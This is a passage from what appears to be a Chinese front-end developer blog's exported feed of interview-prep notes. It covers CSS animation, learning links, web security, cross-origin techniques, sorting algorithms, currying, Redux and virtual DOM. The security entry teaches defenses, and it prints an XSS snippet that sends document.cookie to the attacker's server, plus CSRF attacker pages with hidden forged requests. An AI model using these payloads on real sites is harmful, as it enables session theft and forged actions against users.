height Windows Surface RT, iPhone 5s (iOS7), iPad 3 (iOS 6), iPad 3 (iOS7), Samsung Galaxy Tab 2, Chrome, Firefox, Safari, Opera, Kindle Fire HD, IE11 (none) translate, scale Windows Surface RT, iPhone 5s (iOS7), iPad 3 (iOS7), Samsung Galaxy Tab 2, Firefox, Opera, IE11 iPad 3 (iOS6), Safari, Chrome 可以看到，Chromium以外的其他浏览器没有这方面的CSS动画效率的优化。尽管MSDN提到“它可提供更好的呈现性能”，但测试并没有支持这一点。 现今CSS动画和JS动画主要的不同点是 功能涵盖面，JS比CSS3大 定义动画过程的@keyframes不支持递归定义，如果有多种类似的动画过程，需要调节多个参数来生成的话，将会有很大的冗余（比如jQuery Mobile的动画方案），而JS则天然可以以一套函数实现多个不同的动画过程 时间尺度上，@keyframes的动画粒度粗，而JS的动画粒度控制可以很细 CSS3动画里被支持的时间函数非常少，不够灵活 以现有的接口，CSS3动画无法做到支持两个以上的状态转化 实现/重构难度不一，CSS3比JS更简单，性能调优方向固定 对于帧速表现不好的低版本浏览器，CSS3可以做到自然降级，而JS则需要撰写额外代码 CSS动画有天然事件支持（TransitionEnd、AnimationEnd，但是它们都需要针对浏览器加前缀），JS则需要自己写事件 CSS3有兼容性问题，而JS大多时候没有兼容性问题]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端学习资料]]></title>
    <url>%2F2018%2F05%2F06%2F%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%2F</url>
    <content type="text"><![CDATA[前端知识结构 https://github.com/JacksonTian/fks 前端入门：https://github.com/qiu-deqing/FE-learning 博客： https://www.xuanfengge.com https://www.w3cplus.com/ https://www.w3ctech.com/ http://www.css88.com/ https://www.qianduan.net/ http://www.ruanyifeng.com/blog/ http://javascript.ruanyifeng.com/ http://es6.ruanyifeng.com/ 书籍：https://www.xuanfengge.com/fe-books.html 公司前端团队 腾讯 AlloyTeam http://www.alloyteam.com/ 百度fex http://fex.baidu.com/ 百度efe http://efe.baidu.com/ 淘宝FED http://taobaofed.org/ 去哪儿UED http://ued.qunar.com/ 奇舞团 https://75team.com/ 开源项目 Facebook Projects https://code.facebook.com/projects/web/ 百度fex https://github.com/fex-team/ efe https://github.com/ecomfe alloyteam-github http://alloyteam.github.io/ underscore源码解读 https://github.com/hanzichi/underscore-analysis vue源码学习 https://github.com/answershuto/learnVue 前端学习资源汇总：https://jeffjade.com/2016/03/30/104-front-end-tutorial/]]></content>
      <categories>
        <category>前端学习资料</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[其他问题总结]]></title>
    <url>%2F2018%2F05%2F06%2F%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[==1. WEB前端安全那些事儿==前端攻击都有哪些形式，我该如何防范？XSS攻击是什么？XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。举个例子，我们有个社交网站，允许大家相互访问空间，网站可能是这样做的：其实在web前端方面，可以简单的理解为一种javascript代码注入。 1234567891011121314151617181920212223&lt;?php $username="侯医生";?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo $username;?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 运行时，展现形式如图所示： 但是，如果你的用户名，起名称的时候，带上script标签呢？我们知道，浏览器遇到html中的script标签的时候，会解析并执行标签中的js脚本代码，那么如果你的用户名称里面含有script标签的话，就可以执行其中的代码了。代码如下，效果如图 123&lt;?php $username=&quot;&lt;script&gt;alert(&apos;侯医生&apos;);&lt;/script&gt;&quot;;?&gt; 如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码： 12345$.ajax(&#123; url: &apos;自己的服务器&apos;, dataType: &apos;jsonp&apos;, data: &#123;&apos;盗取的用户cookie&apos;: document.cookie&#125;&#125;); 如何防范目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示，代码如下，效果如图 123456789101112131415161718192021222324&lt;?php $username="&lt;script&gt;alert('侯医生');&lt;/script&gt;";?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;/head&gt; &lt;body&gt; &lt;!--我们将输出的后端变量，转义之后再输出，则可以避免被注入代码--&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 其实，我们再来看看网页源码，如图1.2.2 虽然显示出来是有script标签的，但是实际上，script标签的左右尖括号(&gt;&lt;)，均被转义为html字符实体，所以，便不会被当做标签来解析的，但是实际显示的时候，这两个尖括号，还是可以正常展示的。 升级防御我们将输出的字符串中的\反斜杠进行转义(json转义)。这样，\就不会被当做unicode码的开头来被处理了。代码如下： 1document.getElementById(&apos;username_info&apos;).innerHTML = &lt;?php echo json_encode(htmlentities($username));?&gt;; 都说了道高一尺魔高一丈了，你以为防得住后端输出，黑客大大们就没办法攻击了吗。我们有的时候，会有一些习惯，拿URL上的get参数去构建网页。好比说，直接拿url上的用户名去展示啦，拿url上的一些回跳地址之类的。但是url上的参数，我们是无法提前对其进行转义的。接下来，来个例子，代码如下： 1234567891011121314151617181920212223242526&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;div&gt;版权所有：&lt;span id=&quot;username_info&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;script&gt; var param = /=(.+)$/.exec(location.search); var value = decodeURIComponent(param[1]); $(&apos;#username_info&apos;).append(value); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 上述代码，满足了一个很正常的需求，解开URL中的一个参数，并将其渲染至页面上。但是，这里面存在一个风险，如果黑客在URL的这个参数中，加入js代码，这样便又会被执行。 像这种从url中获取的信息，笔者建议，最好由后端获取，在前端转义后再行输出，代码如下，效果如图 1234&lt;script&gt; var value = decodeURIComponent(&quot;&lt;?php echo htmlentities($_GET[&apos;username&apos;]);?&gt;&quot;); $(&apos;#username_info&apos;).append(value);&lt;/script&gt; 如果不幸中招了，黑客的js真的在我们的网页上执行了，我们该怎么办。其实，很多时候，我们的敏感信息都是存储在cookie中的（不要把用户机密信息放在网页中），想要阻止黑客通过js访问到cookie中的用户敏感信息。那么请使用cookie的HttpOnly属性，加上了这个属性的cookie字段，js是无法进行读写的。php的设置方法如下： 123&lt;?php setcookie(&quot;userpass&quot;, &quot;doctorhou-shuai&quot;, NULL, NULL, NULL, NULL, TRUE);?&gt; 如图，我们的cookie已经种上了，并且有了httpOnly标识我们通过js无法获取cookie中的设定有httpOnly的字段： CSRF攻击CSRF攻击在百度百科中的解释是：CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上(如：你所使用的网络银行的网站)。 如何攻击？要合理使用post与get通常我们会为了省事儿，把一些应当提交的数据，做成get请求。殊不知，这不仅仅是违反了http的标准而已，也同样会被黑客所利用。比如，你开发的网站中，有一个购买商品的操作。你是这么开发的： 1234567891011&lt;?php// 从cookie中获取用户名，看似稳妥$username = $_COOKIE[&apos;username&apos;];$productId = $_GET[&apos;pid&apos;];// 这里进行购买操作//store_into_database($username, $productId);?&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;?phpecho $username . &apos;买入商品：&apos; . $productId;?&gt; 而商品ID图个省事儿，就使用了url中的get参数。买商品的话，如图 那么，黑客的网站可以这样开发：&lt;!DOCYTPE HTML&gt; 12345678&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=&quot;http://localhost:8082/lab/xsrflab/submit.php?pid=1&quot; /&gt; &lt;/body&gt;&lt;/html&gt; 这样的话，用户只需要访问一次黑客的网站，其实就相当于在你的网站中，操作了一次。然而用户却没有感知。 如果你使用了post请求来处理关键业务的，还是有办法可以破解的。我们的业务代码如下： 1234567891011&lt;?php$username = $_COOKIE[&apos;username&apos;];// 换为post了，可以规避黑客直接的提交$productId = $_POST[&apos;pid&apos;];// 这里进行购买操作//store_into_database($username, $productId);?&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;?phpecho $username . &apos;买入商品：&apos; . $productId;?&gt; 黑客代码如下： 1234567891011121314151617181920&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button id=&quot;clickme&quot;&gt;点我看相册&lt;/button&gt; &lt;script&gt; $(&apos;#clickme&apos;).on(&apos;click&apos;, function () &#123; // 用户再不知情的情况下，提交了表单，服务器这边也会以为是用户提交过来的。 $(&apos;#myform&apos;).submit(); &#125;); &lt;/script&gt; &lt;form id=&quot;myform&quot; style=&quot;display:none;&quot; target=&quot;myformer&quot; method=&quot;post&quot; action=&quot;http://myhost:8082/lab/xsrflab/submit.php&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;pid&quot; value=&quot;1&quot;&gt; &lt;/form&gt; &lt;iframe name=&quot;myformer&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 效果如图 点击后，用户进行了提交，却连自己都不知情。这种情况如何防御呢？ 最简单的办法就是加验证码，这样除了用户，黑客的网站是获取不到用户本次session的验证码的。但是这样也会降低用户的提交体验，特别是有些经常性的操作，如果总让用户输入验证码，用户也会非常的烦。 另一种方式，就是在用访问的页面中，都种下验证用的token，用户所有的提交都必须带上本次页面中生成的token，这种方式的本质和使用验证码没什么两样，但是这种方式，整个页面每一次的session，使用同一个token就行，很多post操作，开发者就可以自动带上当前页面的token。如果token校验不通过，则证明此次提交并非从本站发送来，则终止提交过程。如果token确实为本网站生成的话，则可以通过 网络劫持攻击很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以结果该用户收发的所有数据。这里，建议站长们网站都使用https进行加密。这样，就算网站的数据能被拿到，黑客也无法解开。 如果你的网站还没有进行https加密的化，则在表单提交部分，最好进行非对称加密–即客户端加密，只有服务端能解开。这样中间的劫持者便无法获取加密内容的真实信息了。 控制台注入代码我们平时开发要注意些什么？ 开发时要提防用户产生的内容，要对用户输入的信息进行层层检测 要注意对用户的输出内容进行过滤(进行转义等) 重要的内容记得要加密传输(无论是利用https也好，自己加密也好) get请求与post请求，要严格遵守规范，不要混用，不要将一些危险的提交使用jsonp完成。 对于URL上携带的信息，要谨慎使用。 心中时刻记着，自己的网站哪里可能有危险。 ==2. 跨域==受浏览器同源策略的限制，本域的js不能操作其他域的页面对象（比如DOM）。但在安全限制的同时也给注入iframe或是ajax应用上带来了不少麻烦。所以我们要通过一些方法使本域的js能够操作其他域的页面对象或者使其他域的js能操作本域的页面对象 单向跨域（一般用于获取数据） jsonp原理：因为通过script标签引入的js是不受同源策略的限制的（正如前文提到的baidu.com的页面加载了google.com的js）。所以我们可以通过script标签引入一个js或者是一个其他后缀形式（如php，jsp等）的文件，此文件返回一个js函数的调用，如返回JSONP_getUsers([“paco”,”john”,”lili”])，也就是说此文件返回的结果调用了JSONP_getUsers函数，并且把[“paco”,”john”,”lili”]传进去，这个[“paco”,”john”,”lili”]是一个用户列表。那么如果此时我们的页面中有一个JSONP_getUsers函数，那么JSONP_getUsers就被调用到，并且传入了用户列表。此时就实现了在本域获取其他域数据的功能，也就是跨域 动态创建script标签这种方法其实是JSONP跨域的简化版，JSONP只是在此基础上加入了回调函数。 Access Control此跨域方法目前只在很少的浏览器中得以支持，这些浏览器可以发送一个跨域的HTTP请求（Firefox, Google Chrome等通过XMLHTTPRequest实现，IE8下通过XDomainRequest实现），请求的响应必须包含一个Access- Control-Allow-Origin的HTTP响应头，该响应头声明了请求域的可访问权限。例如baidu.com对google.com下的getUsers.php发送了一个跨域的HTTP请求（通过ajax），那么getUsers.php必须加入如下的响应头： 1header(&quot;Access-Control-Allow-Origin: http://www.baidu.com&quot;);//表示允许baidu.com跨域请求本文件 window.namewindow 对象的name属性是一个很特别的属性，当该window的location变化，然后重新加载，它的name属性可以依然保持不变。那么我们可以在页面 A中用iframe加载其他域的页面B，而页面B中用JavaScript把需要传递的数据赋值给window.name，iframe加载完成之后（iframe.onload），页面A修改iframe的地址，将其变成同域的一个地址，然后就可以读出iframe的window.name的值了（因为A中的window.name和iframe中的window.name互相独立的，所以不能直接在A中获取window.name，而要通过iframe获取其window.name）。这个方式非常适合单向的数据请求，而且协议简单、安全。不会像JSONP那样不做限制地执行外部脚本。 服务器代理在数据提供方没有提供对JSONP协议或者 window.name协议的支持，也没有对其它域开放访问权限时，我们可以通过server proxy的方式来抓取数据。例如当baidu.com域下的页面需要请求google.com下的资源文件getUsers.php时，直接发送一个指向 google.com/getUsers.php的Ajax请求肯定是会被浏览器阻止。这时，我们在baidu.com下配一个代理，然后把Ajax请求绑定到这个代理路径下，例如baidu.com/proxy/, 然后这个代理发送HTTP请求访问google.com下的getUsers.php，跨域的HTTP请求是在服务器端进行的（服务器端没有同源策略限制），客户端并没有产生跨域的Ajax请求。这个跨域方式不需要和目标资源签订协议，带有侵略性。 document.domain（两个iframe之间）通过修改document的domain属性，我们可以在域和子域或者不同的子域之间通信。同域策略认为域和子域隶属于不同的域，比如baidu.com和 youxi.baidu.com是不同的域，这时，我们无法在baidu.com下的页面中调用youxi.baidu.com中定义的JavaScript方法。但是当我们把它们document的domain属性都修改为baidu.com，浏览器就会认为它们处于同一个域下，那么我们就可以互相获取对方数据或者操作对方DOM了。 问题：1、安全性，当一个站点被攻击后，另一个站点会引起安全漏洞。2、如果一个页面中引入多个iframe，要想能够操作所有iframe，必须都得设置相同domain。 location.hash（两个iframe之间），又称FIM，Fragment Identitier Messaging的简写因为父窗口可以对iframe进行URL读写，iframe也可以读写父窗口的URL，URL有一部分被称为hash，就是#号及其后面的字符，它一般用于浏览器锚点定位，Server端并不关心这部分，应该说HTTP请求过程中不会携带hash，所以这部分的修改不会产生HTTP请求，但是会产生浏览器历史记录。此方法的原理就是改变URL的hash部分来进行双向通信。每个window通过改变其他 window的location来发送消息（由于两个页面不在同一个域下IE、Chrome不允许修改parent.location.hash的值，所以要借助于父窗口域名下的一个代理iframe），并通过监听自己的URL的变化来接收消息。这个方式的通信会造成一些不必要的浏览器历史记录，而且有些浏览器不支持onhashchange事件，需要轮询来获知URL的改变，最后，这样做也存在缺点，诸如数据直接暴露在了url中，数据容量和类型都有限等。 使用HTML5的postMessage方法（两个iframe之间或者两个页面之间）高级浏览器Internet Explorer 8+, chrome，Firefox , Opera 和 Safari 都将支持这个功能。这个功能主要包括接受信息的”message”事件和发送消息的”postMessage”方法。比如baidu.com域的A页面通过iframe嵌入了一个google.com域的B页面，可以通过以下方法实现A和B的通信 A页面通过postMessage方法发送消息： 12345window.onload = function() &#123; var ifr = document.getElementById(&apos;ifr&apos;); var targetOrigin = &quot;http://www.google.com&quot;; ifr.contentWindow.postMessage(&apos;hello world!&apos;, targetOrigin); &#125;; postMessage的使用方法： otherWindow.postMessage(message, targetOrigin); otherWindow: 指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口message: 是要发送的消息，类型为 String、Object (IE8、9 不支持)targetOrigin: 是限定消息接收范围，不限制请使用 ‘*’ B页面通过message事件监听并接受消息: 1234567891011121314var onmessage = function (event) &#123; var data = event.data;//消息 var origin = event.origin;//消息来源地址 var source = event.source;//源Window对象 if(origin==&quot;http://www.baidu.com&quot;)&#123; console.log(data);//hello world! &#125; &#125;; if (typeof window.addEventListener != &apos;undefined&apos;) &#123; window.addEventListener(&apos;message&apos;, onmessage, false); &#125; else if (typeof window.attachEvent != &apos;undefined&apos;) &#123; //for ie window.attachEvent(&apos;onmessage&apos;, onmessage); &#125; ==3.一次完整的HTTP事务是怎样的一个过程？==基本流程：a. 域名解析b. 发起TCP的3次握手c. 建立TCP连接后发起http请求d. 服务器端响应http请求，浏览器得到html代码e. 浏览器解析html代码，并请求html代码中的资源f. 浏览器对页面进行渲染呈现给用户 ==4. 排序算法== 冒泡排序两两比较，若反则交换位置12345678910111213function bubbleSort(arr) &#123; var len = arr.length; for (var i = 0; i &lt; len; i++) &#123; for (var j = 0; j &lt; len - 1 - i; j++) &#123; if (arr[j] &gt; arr[j+1]) &#123; //相邻元素两两对比 var temp = arr[j+1]; //元素交换 arr[j+1] = arr[j]; arr[j] = temp; &#125; &#125; &#125; return arr;&#125; 选择排序每次都找最小的数12345678910111213141516function selectionSort(arr) &#123; var len = arr.length; var minIndex, temp; for (var i = 0; i &lt; len - 1; i++) &#123; minIndex = i; for (var j = i + 1; j &lt; len; j++) &#123; if (arr[j] &lt; arr[minIndex]) &#123; //寻找最小的数 minIndex = j; //将最小数的索引保存 &#125; &#125; temp = arr[i]; arr[i] = arr[minIndex]; arr[minIndex] = temp; &#125; return arr;&#125; 插入排序1234567891011121314function insertionSort(arr) &#123; var len = arr.length; var preIndex, current; for (var i = 1; i &lt; len; i++) &#123; preIndex = i - 1; current = arr[i]; while(preIndex &gt;= 0 &amp;&amp; arr[preIndex] &gt; current) &#123; arr[preIndex+1] = arr[preIndex]; preIndex--; &#125; arr[preIndex+1] = current; &#125; return arr;&#125; 希尔排序123456789101112131415161718function shellSort(arr) &#123; var len = arr.length, temp, gap = 1; while(gap &lt; len/3) &#123; //动态定义间隔序列 gap =gap*3+1; &#125; for (gap; gap&gt; 0; gap = Math.floor(gap/3)) &#123; for (var i = gap; i &lt; len; i++) &#123; temp = arr[i]; for (var j = i-gap; j &gt; 0 &amp;&amp; arr[j]&gt; temp; j-=gap) &#123; arr[j+gap] = arr[j]; &#125; arr[j+gap] = temp; &#125; &#125; return arr;&#125; 归并排序12345678910111213141516171819202122232425262728293031function mergeSort(arr) &#123; //采用自上而下的递归方法 var len = arr.length; if(len &lt; 2) &#123; return arr; &#125; var middle = Math.floor(len / 2), left = arr.slice(0, middle), right = arr.slice(middle); return merge(mergeSort(left), mergeSort(right));&#125;function merge(left, right)&#123; var result = []; while (left.length&gt;0 &amp;&amp; right.length&gt;0) &#123; if (left[0] &lt;= right[0]) &#123; result.push(left.shift()); &#125; else &#123; result.push(right.shift()); &#125; &#125; while (left.length) result.push(left.shift()); while (right.length) result.push(right.shift()); return result;&#125; 快速排序1234567891011121314151617181920212223242526272829303132function quickSort(arr, left, right) &#123; var len = arr.length, partitionIndex, left = typeof left != 'number' ? 0 : left, right = typeof right != 'number' ? len - 1 : right; if (left &lt; right) &#123; partitionIndex = partition(arr, left, right); quickSort(arr, left, partitionIndex-1); quickSort(arr, partitionIndex+1, right); &#125; return arr;&#125;function partition(arr, left ,right) &#123; //分区操作 var pivot = left, //设定基准值（pivot） index = pivot + 1; for (var i = index; i &lt;= right; i++) &#123; if (arr[i] &lt; arr[pivot]) &#123; swap(arr, i, index); index++; &#125; &#125; swap(arr, pivot, index - 1); return index-1;&#125;function swap(arr, i, j) &#123; var temp = arr[i]; arr[i] = arr[j]; arr[j] = temp;&#125; 堆排序 1234567891011121314151617181920212223242526272829303132333435363738394041424344var len; //因为声明的多个函数都需要数据长度，所以把len设置成为全局变量function buildMaxHeap(arr) &#123; //建立大顶堆 len = arr.length; for (var i = Math.floor(len/2); i &amp;gt;= 0; i--) &#123; heapify(arr, i); &#125;&#125;function heapify(arr, i) &#123; //堆调整 var left = 2 * i + 1, right = 2 * i + 2, largest = i; if (left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) &#123; largest = left; &#125; if (right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) &#123; largest = right; &#125; if (largest != i) &#123; swap(arr, i, largest); heapify(arr, largest); &#125;&#125;function swap(arr, i, j) &#123; var temp = arr[i]; arr[i] = arr[j]; arr[j] = temp;&#125;function heapSort(arr) &#123; buildMaxHeap(arr); for (var i = arr.length-1; i &gt; 0; i--) &#123; swap(arr, 0, i); len--; heapify(arr, 0); &#125; return arr;&#125; ==5. 函数式编程==函数式编程有一下几个特点： 函数是“第一等公民”：函数与其他数据类型一样，可以赋值给其他变量，也可以作为参数，传入另一个函数，或作为别的函数的返回值 只用“表达书”，不用语句：每一步都是单纯的运算，而且都有返回值 没有“副作用”：函数要保持独立，所有功能就是返回一个新的值，没有其他行为，尤其不得修改外部变量的值 不修改状态，返回新的值，不修改系统变量 引用透明：函数的运行不依赖与外部变量或“状态”，只依赖于输入的参数，任何时候只要参数相同，引用函数所得到的返回值总是相同的 优点： 代码简洁，开发快速：函数式编程大量使用函数，减少了代码的重复，因此程序比较短，开发速度较快 接近自然语言，易于理解 更方便的代码管理：函数式编程不依赖、也不会改变外界的状态，只要给定输入参数，返回的结果必定相同。因此，每一个函数都可以被看做独立单元，很有利于进行单元测试（unit testing）和除错（debugging），以及模块化组合。 易于”并发编程”：函数式编程不需要考虑”死锁”（deadlock），因为它不修改变量，所以根本不存在”锁”线程的问题。不必担心一个线程的数据，被另一个线程修改，所以可以很放心地把工作分摊到多个线程，部署”并发编程”（concurrency） 代码的热升级：函数式编程没有副作用，只要保证接口不变，内部实现是外部无关的。所以，可以在运行状态下直接升级代码，不需要重启，也不需要停机。 ==6. 函数式编程——柯里化（curry）==curry 的概念很简单：只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数 1234567891011121314var add = function(x) &#123; return function(y) &#123; return x + y; &#125;;&#125;;var increment = add(1);var addTen = add(10);increment(2);// 3addTen(2);// 12 我们来创建一些 curry 函数享受下（译者注：此处原文是“for our enjoyment”，语出自圣经） 1234567891011121314151617var curry = require('lodash').curry;var match = curry(function(what, str) &#123; return str.match(what);&#125;);var replace = curry(function(what, replacement, str) &#123; return str.replace(what, replacement);&#125;);var filter = curry(function(f, ary) &#123; return ary.filter(f);&#125;);var map = curry(function(f, ary) &#123; return ary.map(f);&#125;); 我在上面的代码中遵循的是一种简单，同时也非常重要的模式。即策略性地把要操作的数据（String， Array）放到最后一个参数里。到使用它们的时候你就明白这样做的原因是什么了。 1234567891011121314151617181920212223242526272829303132match(/\s+/g, "hello world");// [ ' ' ]match(/\s+/g)("hello world");// [ ' ' ]var hasSpaces = match(/\s+/g);// function(x) &#123; return x.match(/\s+/g) &#125;hasSpaces("hello world");// [ ' ' ]hasSpaces("spaceless");// nullfilter(hasSpaces, ["tori_spelling", "tori amos"]);// ["tori amos"]var findSpaces = filter(hasSpaces);// function(xs) &#123; return xs.filter(function(x) &#123; return x.match(/\s+/g) &#125;) &#125;findSpaces(["tori_spelling", "tori amos"]);// ["tori amos"]var noVowels = replace(/[aeiou]/ig);// function(replacement, x) &#123; return x.replace(/[aeiou]/ig, replacement) &#125;var censored = noVowels("*");// function(x) &#123; return x.replace(/[aeiou]/ig, "*") &#125;censored("Chocolate Rain");// 'Ch*c*l*t* R**n' 这里表明的是一种“预加载”函数的能力，通过传递一到两个参数调用函数，就能得到一个记住了这些参数的新函数。 ==7. redux理解== React有props和state: props意味着父级分发下来的属性，state意味着组件内部可以自行管理的状态，并且整个React没有数据向上回溯的能力，也就是说数据只能单向向下分发，或者自行内部消化。理解这个是理解React和Redux的前提。 一般构建的React组件内部可能是一个完整的应用，它自己工作良好，你可以通过属性作为API控制它。但是更多的时候发现React根本无法让两个组件互相交流，使用对方的数据。然后这时候不通过DOM沟通（也就是React体制内）解决的唯一办法就是提升state，将state放到共有的父组件中来管理，再作为props分发回子组件。 子组件改变父组件state的办法只能是通过onClick触发父组件声明好的回调，也就是父组件提前声明好函数或方法作为契约描述自己的state将如何变化，再将它同样作为属性交给子组件使用。这样就出现了一个模式：数据总是单向从顶层向下分发的，但是只有子组件回调在概念上可以回到state顶层影响数据。这样state一定程度上是响应式的。 为了面临所有可能的扩展问题，最容易想到的办法就是把所有state集中放到所有组件顶层，然后分发给所有组件。 为了有更好的state管理，就需要一个库来作为更专业的顶层state分发给所有React应用，这就是Redux。让我们回来看看重现上面结构的需求： 需要回调通知state (等同于回调参数) -&gt; action 需要根据回调处理 (等同于父级方法) -&gt; reducer 需要state (等同于总状态) -&gt; store 对Redux来说只有这三个要素： action是纯声明式的数据结构，只提供事件的所有要素，不提供逻辑 reducer是一个匹配函数，action的发送是全局的：所有的reducer都可以捕捉到并匹配与自己相关与否，相关就拿走action中的要素进行逻辑处理，修改store中的状态，不相关就不对state做处理原样返回。 store负责存储状态并可以被react api回调，发布action.当然一般不会直接把两个库拿来用，还有一个binding叫react-redux, 提供一个Provider和connect。 很多人其实看懂了redux卡在这里。 Provider是一个普通组件，可以作为顶层app的分发点，它只需要store属性就可以了。它会将state分发给所有被connect的组件，不管它在哪里，被嵌套多少层。 connect是真正的重点，它是一个科里化函数，意思是先接受两个参数（数据绑定mapStateToProps和事件绑定mapDispatchToProps），再接受一个参数（将要绑定的组件本身）：mapStateToProps：构建好Redux系统的时候，它会被自动初始化，但是你的React组件并不知道它的存在，因此你需要分拣出你需要的Redux状态，所以你需要绑定一个函数，它的参数是state，简单返回你关心的几个值。 mapDispatchToProps：声明好的action作为回调，也可以被注入到组件里，就是通过这个函数，它的参数是dispatch，通过redux的辅助方法bindActionCreator绑定所有action以及参数的dispatch，就可以作为属性在组件里面作为函数简单使用了，不需要手动dispatch。这个mapDispatchToProps是可选的，如果不传这个参数redux会简单把dispatch作为属性注入给组件，可以手动当做store.dispatch使用。这也是为什么要科里化的原因。 做好以上流程Redux和React就可以工作了。简单地说就是： 顶层分发状态，让React组件被动地渲染。 监听事件，事件有权利回到所有状态顶层影响状态。 ==8. 虚拟dom==相关链接：深度剖析：如何实现一个 Virtual DOM 算法 源码网址： GitHub 目录： 对前端应用状态管理思考 Virtual DOM 算法 算法实现 步骤一：用JS对象模拟DOM树 步骤二：比较两棵虚拟DOM树的差异 步骤三：把差异应用到真正的DOM树上 结语 References 1 对前端应用状态管理的思考假如现在你需要写一个像下面一样的表格的应用程序，这个表格可以根据不同的字段进行升序或者降序的展示。 这个应用程序看起来很简单，你可以想出好几种不同的方式来写。最容易想到的可能是，在你的 JavaScript 代码里面存储这样的数据： 123var sortKey = "new" // 排序的字段，新增（new）、取消（cancel）、净关注（gain）、累积（cumulate）人数var sortType = 1 // 升序还是逆序var data = [&#123;...&#125;, &#123;...&#125;, &#123;..&#125;, ..] // 表格数据 用三个字段分别存储当前排序的字段、排序方向、还有表格数据；然后给表格头部加点击事件：当用户点击特定的字段的时候，根据上面几个字段存储的内容来对内容进行排序，然后用 JS 或者 jQuery 操作 DOM，更新页面的排序状态（表头的那几个箭头表示当前排序状态，也需要更新）和表格内容。 这样做会导致的后果就是，随着应用程序越来越复杂，需要在JS里面维护的字段也越来越多，需要监听事件和在事件回调用更新页面的DOM操作也越来越多，应用程序会变得非常难维护。后来人们使用了 MVC、MVP 的架构模式，希望能从代码组织方式来降低维护这种复杂应用程序的难度。但是 MVC 架构没办法减少你所维护的状态，也没有降低状态更新你需要对页面的更新操作（前端来说就是DOM操作），你需要操作的DOM还是需要操作，只是换了个地方。 既然状态改变了要操作相应的DOM元素，为什么不做一个东西可以让视图和状态进行绑定，状态变更了视图自动变更，就不用手动更新页面了。这就是后来人们想出了 MVVM 模式，只要在模版中声明视图组件是和什么状态进行绑定的，双向绑定引擎就会在状态更新的时候自动更新视图（关于MV*模式的内容，可以看这篇介绍）。 MVVM 可以很好的降低我们维护状态 -&gt; 视图的复杂程度（大大减少代码中的视图更新逻辑）。但是这不是唯一的办法，还有一个非常直观的方法，可以大大降低视图更新的操作：一旦状态发生了变化，就用模版引擎重新渲染整个视图，然后用新的视图更换掉旧的视图。就像上面的表格，当用户点击的时候，还是在JS里面更新状态，但是页面更新就不用手动操作 DOM 